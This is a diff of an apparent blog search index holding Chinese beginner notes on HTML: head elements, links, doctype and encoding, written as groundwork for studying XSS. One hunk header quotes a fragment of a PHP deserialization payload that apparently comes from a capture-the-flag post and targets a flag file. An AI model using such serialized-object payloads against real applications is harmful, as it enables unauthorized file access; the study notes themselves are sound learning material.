+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+<hr>
+<h3 id="html-link-元素"><a class="markdownIt-Anchor" href="#html-link-元素"></a> HTML  link 元素</h3>
+<p><code>&lt;link&gt; </code>标签定义了文档与外部资源之间的关系。</p>
+<p><code>&lt;link&gt; </code>标签通常用于链接到样式表:</p>
+<p>可以在左侧显示logo等图片</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;图片url&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>这是一个带图片的标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+<hr>
+<h3 id="html-style-元素"><a class="markdownIt-Anchor" href="#html-style-元素"></a> HTML  style 元素</h3>
+<p><code>&lt;style&gt;</code> 标签定义了HTML文档的样式文件引用地址.</p>
+<p>在<code>&lt;style&gt; </code>元素中你也可以直接添加样式来渲染 HTML 文档:</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"> </span>
+<span class="language-css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125; </span>
+<span class="language-css">    <span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue&#125; </span>
+<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+<hr>
+<h3 id="html-meta-元素"><a class="markdownIt-Anchor" href="#html-meta-元素"></a> HTML meta 元素</h3>
+<p>meta标签描述了一些基本的元数据。</p>
+<p><code>&lt;meta&gt; </code>标签提供了元数据.元数据也不显示在页面上，但会被浏览器解析。</p>
+<p>META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。</p>
+<p>元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。</p>
+<p><code>&lt;meta&gt;</code> 一般放置于 <code>&lt;head&gt;</code> 区域</p>
+<ul>
+<li><code>&lt;meta&gt;</code> 标签- 使用实例</li>
+</ul>
+<p>为搜索引擎定义关键词:</p>
+<pre><code class="highlight plaintext">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</code></pre>
+<p>为网页定义描述内容:</p>
+<pre><code class="highlight plaintext">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</code></pre>
+<p>定义网页作者:</p>
+<pre><code class="highlight plaintext">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</code></pre>
+<p>每30秒钟刷新当前页面:</p>
+<pre><code class="highlight plaintext">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</code></pre>
+<hr>
+<h3 id="html-script-元素"><a class="markdownIt-Anchor" href="#html-script-元素"></a> HTML script 元素</h3>
+<pre><code class="highlight plaintext">&lt;script&gt;标签用于加载脚本文件，如： JavaScript。
+
+&lt;script&gt; 元素在以后的章节中会详细描述。</code></pre>
+<hr>
+<p><strong>总结:HTML head 元素</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">标签</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><head></head></td>
+<td style="text-align:left">定义了文档的信息</td>
+</tr>
+<tr>
+<td style="text-align:left"><title></title></td>
+<td style="text-align:left">定义了文档的标题</td>
+</tr>
+<tr>
+<td style="text-align:left"><base></td>
+<td style="text-align:left">定义了页面链接标签的默认链接地址</td>
+</tr>
+<tr>
+<td style="text-align:left"><link></td>
+<td style="text-align:left">定义了一个文档和外部资源之间的关系</td>
+</tr>
+<tr>
+<td style="text-align:left"><meta></td>
+<td style="text-align:left">定义了HTML文档中的元数据</td>
+</tr>
+<tr>
+<td style="text-align:left"><script></td>
+<td style="text-align:left">定义了客户端的脚本文件</td>
+</tr>
+<tr>
+<td style="text-align:left"><style></td>
+<td style="text-align:left">定义了HTML文档的样式文件</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>[!IMPORTANT]</p>
+</blockquote>
+<p>head 标签用于定义文档头部，它是所有头部元素的容器。<head> 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等等。</p>
+<p>如：</p>
+<pre><code class="highlight plaintext">&lt;html&gt;
+  &lt;head&gt;
+     &lt;title&gt;文档标题&lt;/title&gt;
+  &lt;/head&gt;
+&lt;/html&gt;</code></pre>
+<p>header 标签用于定义文档的页眉（介绍信息）。</p>
+<p>如：</p>
+<pre><code class="highlight plaintext">&lt;html&gt;
+  &lt;body&gt;
+    &lt;header&gt;
+        &lt;p&gt;段落&lt;/p&gt;
+        &lt;h1&gt;一级标题&lt;/h1&gt;
+    &lt;/header&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>注意千万不要弄混。</p>
+</script></td></tr></tbody></table>]]></content>
+      <tags>
+        <tag>-HTML -Web前端</tag>
       </tags>
   </entry>
   <entry>
@@ -2707,883 +3584,6 @@ O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;
       </tags>
   </entry>
   <entry>
-    <title>HTML学习以及网页搭建初实践</title>
-    <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
-    <content><![CDATA[<h1 id="html学习以及网页搭建初实践"><a class="markdownIt-Anchor" href="#html学习以及网页搭建初实践"></a> HTML学习以及网页搭建初实践</h1>
-<p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p>
-<h2 id="html实例的基本结构"><a class="markdownIt-Anchor" href="#html实例的基本结构"></a> HTML实例的基本结构</h2>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03"></p>
-<ul>
-<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
-<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
-<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
-<li><strong><title></title></strong> 元素描述了文档的标题</li>
-<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
-<li><strong><h1></h1></strong> 元素定义一个大标题</li>
-<li><strong><p></p></strong> 元素定义一个段落</li>
-</ul>
-<p>其实F12查一下源代码就能知道是大致怎么样个结构</p>
-<h2 id="什么是-html"><a class="markdownIt-Anchor" href="#什么是-html"></a> 什么是 HTML?</h2>
-<p>HTML 是用来描述网页的一种语言。</p>
-<ul>
-<li>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</li>
-<li>HTML 不是一种编程语言，而是一种<strong>标记</strong>语言</li>
-<li>标记语言是一套<strong>标记标签</strong> (markup tag)</li>
-<li>HTML 使用标记标签来<strong>描述</strong>网页</li>
-<li>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</li>
-<li>HTML文档也叫做 <strong>web 页面</strong></li>
-</ul>
-<h2 id="html-标签"><a class="markdownIt-Anchor" href="#html-标签"></a> HTML 标签</h2>
-<p>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</p>
-<ul>
-<li>HTML 标签是由<em>尖括号</em>包围的关键词，比如 <html></html></li>
-<li>HTML 标签通常是<em>成对出现</em>的，比如 <b> 和 </b></li>
-<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
-<li>开始和结束标签也被称为<em>开放标签</em>和<em>闭合标签</em></li>
-</ul>
-<p>&lt;标签&gt;内容&lt;/标签&gt;</p>
-<hr>
-<h2 id="html-元素"><a class="markdownIt-Anchor" href="#html-元素"></a> HTML 元素</h2>
-<p>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</p>
-<p>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</p>
-<p>HTML 元素:</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-<h3 id="div"><a class="markdownIt-Anchor" href="#div"></a> <code>&lt;div&gt;</code></h3>
-<p>内容划分元素，通过div与class的搭配轻松将页面划分为多个不同模块</p>
-<h3 id="a"><a class="markdownIt-Anchor" href="#a"></a> <code>&lt;a&gt;</code></h3>
-<p>锚元素，通过其的herf属性来引用其他网页/本地的文件</p>
-<ul>
-<li>
-<p>实例</p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.mozilla.com&quot;&gt; Mozilla &lt;/a&gt; 
-//绝对地址引用
-&lt;a href=&quot;//example.com&quot;&gt;相对于协议的 URL&lt;/a&gt;
-&lt;a href=&quot;/zh-CN/docs/Web/HTML&quot;&gt;相对于源的 URL&lt;/a&gt;
-&lt;a href=&quot;./p&quot;&gt;相对于路径的 URL&lt;/a&gt;
-//相对地址的链接
-&lt;!-- &lt;a&gt; 元素链接到下面部分 --&gt;
-&lt;p&gt;&lt;a href=&quot;#Section_further_down&quot;&gt; 跳转到下方标题 &lt;/a&gt;&lt;/p&gt;
-
-&lt;!-- 要链接到的标题 --&gt;
-&lt;h2 id=&quot;Section_further_down&quot;&gt;更下面的部分&lt;/h2&gt;
-//同页面链接</code></pre>
-<p>当然，你也可以将<code>&lt;a&gt;</code>插入在段落中达到引用的效果</p>
-<h3 id="待补全中"><a class="markdownIt-Anchor" href="#待补全中"></a> (待补全中。。。)</h3>
-</li>
-</ul>
-<h2 id="网页结构"><a class="markdownIt-Anchor" href="#网页结构"></a> 网页结构</h2>
-<p>一般分为head和body</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">html</span>&gt;</span>
-	<span class="tag">&lt;<span class="name">head</span>&gt;</span>
-    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
-	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
-	<span class="tag">&lt;<span class="name">body</span>&gt;</span>
-        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>小标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
-        <span class="tag">&lt;<span class="name">p</span>&gt;</span>正文<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
-    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
-<p>只有body部分会在网页中显示</p>
-<h2 id="html版本"><a class="markdownIt-Anchor" href="#html版本"></a> HTML版本</h2>
-<p>从初期的网络诞生后，已经出现了许多HTML版本:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">版本</th>
-<th style="text-align:left">发布时间</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">HTML</td>
-<td style="text-align:left">1991</td>
-</tr>
-<tr>
-<td style="text-align:left">HTML+</td>
-<td style="text-align:left">1993</td>
-</tr>
-<tr>
-<td style="text-align:left">HTML 2.0</td>
-<td style="text-align:left">1995</td>
-</tr>
-<tr>
-<td style="text-align:left">HTML 3.2</td>
-<td style="text-align:left">1997</td>
-</tr>
-<tr>
-<td style="text-align:left">HTML 4.01</td>
-<td style="text-align:left">1999</td>
-</tr>
-<tr>
-<td style="text-align:left">XHTML 1.0</td>
-<td style="text-align:left">2000</td>
-</tr>
-<tr>
-<td style="text-align:left">HTML5</td>
-<td style="text-align:left">2012</td>
-</tr>
-<tr>
-<td style="text-align:left">XHTML5</td>
-<td style="text-align:left">2013</td>
-</tr>
-</tbody>
-</table>
-<hr>
-<h2 id="doctype-声明"><a class="markdownIt-Anchor" href="#doctype-声明"></a> &lt;!DOCTYPE&gt; 声明</h2>
-<!DOCTYPE>声明有助于浏览器中正确显示网页。
-<p>网络上有很多不同的文件，如果能够正确声明HTML的版本，浏览器就能正确显示网页内容。</p>
-<p>doctype 声明是不区分大小写的，以下方式均可：</p>
-<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
-
-<span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span>
-
-<span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span>
-
-<span class="meta">&lt;!Doctype <span class="keyword">Html</span>&gt;</span></code></pre>
-<hr>
-<h2 id="通用声明"><a class="markdownIt-Anchor" href="#通用声明"></a> 通用声明</h2>
-<h3 id="html5"><a class="markdownIt-Anchor" href="#html5"></a> HTML5</h3>
-<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></code></pre>
-<h3 id="html-401"><a class="markdownIt-Anchor" href="#html-401"></a> HTML 4.01</h3>
-<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span></span>
-<span class="meta"><span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></code></pre>
-<h3 id="xhtml-10"><a class="markdownIt-Anchor" href="#xhtml-10"></a> XHTML 1.0</h3>
-<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span>
-<span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></code></pre>
-<p>查看完整网页声明类型 <a href="https://www.runoob.com/tags/tag-doctype.html">DOCTYPE 参考手册</a>。</p>
-<hr>
-<h2 id="中文编码"><a class="markdownIt-Anchor" href="#中文编码"></a> 中文编码</h2>
-<p>目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK。</p>
-<h2 id="html-实例"><a class="markdownIt-Anchor" href="#html-实例"></a> HTML 实例</h2>
-<p>自己尝试了一下，大概这个效果。?</p>
-<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
-<span class="tag">&lt;<span class="name">html</span>&gt;</span>
-<span class="tag">&lt;<span class="name">head</span>&gt;</span> 
-<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>
-<span class="tag">&lt;<span class="name">title</span>&gt;</span>哼哼哼，你也要来下北泽和我一辈子红茶吗<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">body</span>&gt;</span>
-<span class="tag">&lt;<span class="name">h1</span>&gt;</span> 什么，你的意思是说愿意和我一起看一个一个林擒吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
-
-	<span class="tag">&lt;<span class="name">p</span>&gt;</span>哼哼哼，啊啊啊啊啊啊啊啊啊(指发自内心的高兴嚎叫<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316090224855.png" alt="image-20250316090224855"></p>
-<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> <span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">title</span>&gt;</span> 页面标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span>&gt;</span>  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
-<h2 id="更加完善的结构"><a class="markdownIt-Anchor" href="#更加完善的结构"></a> 更加完善的结构</h2>
-<p><em><strong><strong>开始标签(无/)常被称为</strong>起始标签（opening tag）</strong>，结束标签(有/)常称为</em><em>闭合标签（closing tag）</em>*</p>
-<h3 id="html-标题"><a class="markdownIt-Anchor" href="#html-标题"></a> <strong>HTML 标题</strong></h3>
-<p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的。从1-6标题的大小逐步减小(和markdown的几级标题应该是一个道理)</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
-<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;6&quot;</span>&gt;</span>这是6号字体文本<span class="tag">&lt;/<span class="name">font</span>&gt;</span>
-<span class="comment">&lt;!--size和h1,h2这些一一对应--&gt;</span>
-<span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>
-<span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></code></pre>
-<p>请确保将 HTML 标题 标签只用于标题。不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题。</p>
-<p>搜索引擎使用标题为您的网页的结构和内容编制索引。</p>
-<p>因为用户可以通过标题来快速浏览您的网页，所以用标题来呈现文档结构是很重要的。</p>
-<p>应该将 h1 用作主标题（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p>
-<hr>
-<h3 id="html-段落"><a class="markdownIt-Anchor" href="#html-段落"></a> <strong>HTML 段落</strong></h3>
-<p>HTML 段落是通过标签 <code>&lt;p&gt;</code> 来定义的。</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是另外一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-<hr>
-<h3 id="html-链接"><a class="markdownIt-Anchor" href="#html-链接"></a> <strong>HTML 链接</strong></h3>
-<p>HTML 链接是通过标签<code> &lt;a&gt;</code> 来定义的。</p>
-<p>HTML 链接（Anchor）是网页之间跳转的核心部分。</p>
-<p>HTML 使用链接与网络上的另一个文档相连。</p>
-<p>HTML中的链接是一种用于在不同网页之间导航的元素。</p>
-<p>链接通常用于将一个网页与另一个网页或资源（如文档、图像、音频文件等）相关联。</p>
-<p>链接允许用户在浏览网页时单击文本或图像来跳转到其他位置，从而实现网页之间的互联。</p>
-<p>HTML 链接 通过标签创建，通常用于将用户从一个页面导航到另一个页面、从一个部分跳转到页面中的另一个部分、下载文件、打开电子邮件应用程序或执行 JavaScript 函数等。</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
-<p>**提示:**在 href 属性中指定链接的地址。</p>
-<h4 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h4>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;URL&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
-<ul>
-<li><code>&lt;a&gt;</code> 标签：定义了一个超链接（anchor）。它是 HTML 中用来创建可点击链接的主要标签。</li>
-<li><code>href</code> 属性：指定目标 URL，当点击链接时，浏览器将导航到此 URL。</li>
-</ul>
-<p>以下实例演示来如何在 HTML 文档中创建链接：</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>
-<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向本网站中的一个页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
-<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.microsoft.com/&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向万维网上的页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-<hr>
-<h4 id="html-超链接链接"><a class="markdownIt-Anchor" href="#html-超链接链接"></a> HTML 超链接（链接）</h4>
-<p>HTML使用标签 <code>&lt;a&gt;</code> 来设置超文本链接。</p>
-<p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</p>
-<p>当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</p>
-<p>在标签 <code>&lt;a&gt;</code> 中使用了<code> href</code> 属性来描述链接的地址。</p>
-<p>默认情况下，链接将以以下形式出现在浏览器中：</p>
-<ul>
-<li>一个未访问过的链接显示为蓝色字体并带有下划线。</li>
-<li>访问过的链接显示为紫色并带有下划线。</li>
-<li>点击链接时，链接显示为红色并带有下划线。</li>
-</ul>
-<blockquote>
-<p>注意：如果为这些超链接设置了 CSS 样式，展示样式会根据 CSS 的设定而显示。</p>
-</blockquote>
-<hr>
-<h4 id="html-链接属性"><a class="markdownIt-Anchor" href="#html-链接属性"></a> HTML 链接属性</h4>
-<p><code>href </code>属性描述了链接的目标。</p>
-<h5 id="href定义链接目标"><a class="markdownIt-Anchor" href="#href定义链接目标"></a> href：定义链接目标。</h5>
-<p>这是超链接最重要的属性，用来指定链接的目的地，可以是另一个网页、文件、邮件、电话号码或 JavaScript。</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>访问 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
-<h5 id="target定义链接的打开方式"><a class="markdownIt-Anchor" href="#target定义链接的打开方式"></a> target：定义链接的打开方式。</h5>
-<ul>
-<li><code>_blank</code>: 在新窗口或新标签页中打开链接。</li>
-<li><code>_self</code>: 在当前窗口或标签页中打开链接（默认）。</li>
-<li><code>_parent</code>: 在父框架中打开链接。//后续会了解到</li>
-<li><code>_top</code>: 在整个窗口中打开链接，取消任何框架。//后续会了解到</li>
-</ul>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>新窗口打开 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
-<h5 id="rel定义链接与目标页面的关系"><a class="markdownIt-Anchor" href="#rel定义链接与目标页面的关系"></a> rel：定义链接与目标页面的关系。</h5>
-<p><strong><code>nofollow</code></strong>: 表示搜索引擎不应跟踪该链接，常用于外部链接。</p>
-<p><strong><code>noopener</code></strong> 和 <strong><code>noreferrer</code></strong>: 防止在新标签中打开链接时的安全问题，尤其是使用 <strong>target=“_blank”</strong> 时。</p>
-<ul>
-<li><code>noopener</code>: 防止新的浏览上下文（页面）访问<code>window.opener</code>属性和<code>open</code>方法。</li>
-<li><code>noreferrer</code>: 不发送referer header（即不告诉目标网站你从哪里来的）。</li>
-<li><code>noopener noreferrer</code>: 同时使用<code>noopener</code>和<code>noreferrer</code>。例子: <code>&lt;a href=&quot;https://www.example.com&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></li>
-</ul>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></pre>
-<h5 id="download提示浏览器下载链接目标而不是导航到该目标"><a class="markdownIt-Anchor" href="#download提示浏览器下载链接目标而不是导航到该目标"></a> download：提示浏览器下载链接目标而不是导航到该目标。</h5>
-<p>如果指定了文件名，浏览器会提示下载并保存为指定文件名。</p>
-<p>例如：</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;file.pdf&quot; download=&quot;example.pdf&quot;&gt;下载文件&lt;/a&gt;</code></pre>
-<h5 id="title定义链接的额外信息当鼠标悬停在链接上时显示的工具提示"><a class="markdownIt-Anchor" href="#title定义链接的额外信息当鼠标悬停在链接上时显示的工具提示"></a> title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。</h5>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; title=&quot;访问 Example 网站&quot;&gt;访问 Example&lt;/a&gt;</code></pre>
-<h5 id="id用于链接锚点通常在同一页面中跳转到某个特定位置"><a class="markdownIt-Anchor" href="#id用于链接锚点通常在同一页面中跳转到某个特定位置"></a> id：用于链接锚点，通常在同一页面中跳转到某个特定位置。</h5>
-<ul>
-<li>实例</li>
-</ul>
-<p><em><!-- 链接到页面中的某个部分 --></em><br>
-&lt;<strong>a</strong> href=“#section1”&gt;跳转到第1部分&lt;/<strong>a</strong>&gt;<br>
-&lt;<strong>div</strong> id=“section1”&gt;这是第1部分&lt;/<strong>div</strong>&gt;</p>
-<h5 id="hreflang-指定链接的目标url的语言"><a class="markdownIt-Anchor" href="#hreflang-指定链接的目标url的语言"></a> hreflang: 指定链接的目标URL的语言</h5>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com/es&quot; hreflang=&quot;es&quot;&gt;访问西班牙语网站&lt;/a&gt;</code></pre>
-<h5 id="type-指定链接资源的mime类型"><a class="markdownIt-Anchor" href="#type-指定链接资源的mime类型"></a> type: 指定链接资源的MIME类型</h5>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;样式表&lt;/a&gt;</code></pre>
-<h5 id="class-用于指定元素的类名css中定义"><a class="markdownIt-Anchor" href="#class-用于指定元素的类名css中定义"></a> class: 用于指定元素的类名（CSS中定义）</h5>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; class=&quot;external-link&quot;&gt;外部链接&lt;/a&gt;</code></pre>
-<h5 id="style-直接在元素上定义css样式"><a class="markdownIt-Anchor" href="#style-直接在元素上定义css样式"></a> style: 直接在元素上定义CSS样式</h5>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; style=&quot;color: red;&quot;&gt;红色链接&lt;/a&gt;</code></pre>
-<hr>
-<h4 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> <strong>实例</strong></h4>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot;&gt;访问菜鸟教程&lt;/a&gt;</code></pre>
-<p>上面这行代码显示为：<a href="https://www.runoob.com/">访问菜鸟教程</a></p>
-<p>点击这个超链接会把用户带到菜鸟教程的首页。</p>
-<p><strong>提示:</strong> <em>“链接文本”</em> 不必一定是文本。图片或其他 HTML 元素都可以成为链接。</p>
-<p>**文本链接：**最常见的链接类型是文本链接，它使用 <a> 元素将一段文本转化为可点击的链接，例如：</a></p>
-<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;</code></pre>
